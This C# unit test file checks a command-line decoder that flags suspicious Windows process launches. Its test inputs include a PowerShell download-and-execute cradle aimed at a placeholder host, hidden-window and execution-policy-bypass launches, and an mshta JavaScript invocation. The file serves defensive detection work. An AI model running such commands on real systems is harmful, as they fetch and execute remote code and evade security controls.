using System.Text;
using Wymcmd.Core.Why;
using Xunit;

namespace Wymcmd.Tests;

public class CommandLineDecoderTests
{
    [Fact]
    public void Decodes_encoded_powershell_into_the_original_script()
    {
        const string script = "Start-Sleep -Seconds 2; Write-Output 'hello'";
        var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

        var result = CommandLineDecoder.Decode("powershell.exe", $"powershell.exe -NoProfile -EncodedCommand {encoded}");

        Assert.Equal(script, result.Payload);
        Assert.True(result.Traits.HasFlag(CommandTraits.Encoded));
    }

    [Fact]
    public void Recognises_a_hidden_window_and_a_policy_bypass()
    {
        var result = CommandLineDecoder.Decode("powershell.exe",
            "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -File C:\\temp\\a.ps1");

        Assert.True(result.Traits.HasFlag(CommandTraits.HiddenWindow));
        Assert.True(result.Traits.HasFlag(CommandTraits.BypassesPolicy));
        Assert.True(result.Traits.HasFlag(CommandTraits.RunsScriptFile));
        Assert.Equal("C:\\temp\\a.ps1", result.ScriptPath);
    }

    [Fact]
    public void Unwraps_a_cmd_wrapper_so_the_inner_command_is_visible()
    {
        var result = CommandLineDecoder.Decode("cmd.exe", "\"C:\\Windows\\System32\\cmd.exe\" /c whoami /all");

        Assert.Equal("whoami /all", result.Payload);
    }

    [Fact]
    public void Flags_downloads_inside_an_encoded_payload()
    {
        var script = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/x')";
        var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

        var result = CommandLineDecoder.Decode("powershell.exe", $"powershell -enc {encoded}");

        Assert.True(result.Traits.HasFlag(CommandTraits.DownloadsContent));
    }

    [Fact]
    public void Calls_a_system_binary_with_arguments_a_living_off_the_land_case()
    {
        var result = CommandLineDecoder.Decode("mshta.exe", "mshta.exe javascript:alert(1)");

        Assert.True(result.Traits.HasFlag(CommandTraits.LivingOffTheLand));
    }

    [Fact]
    public void Leaves_a_plain_command_alone()
    {
        var result = CommandLineDecoder.Decode("notepad.exe", "notepad.exe");

        Assert.Equal(CommandTraits.None, result.Traits);
        Assert.Null(result.Payload);
    }

    [Theory]
    [InlineData("\"C:\\Program Files\\App\\a.exe\" -x 1", "C:\\Program Files\\App\\a.exe")]
    [InlineData("cmd.exe /c dir", "cmd.exe")]
    [InlineData("", "")]
    public void Reads_the_executable_out_of_a_command_line(string commandLine, string expected)
    {
        Assert.Equal(expected, CommandLineDecoder.ImageFromCommandLine(commandLine));
    }
}
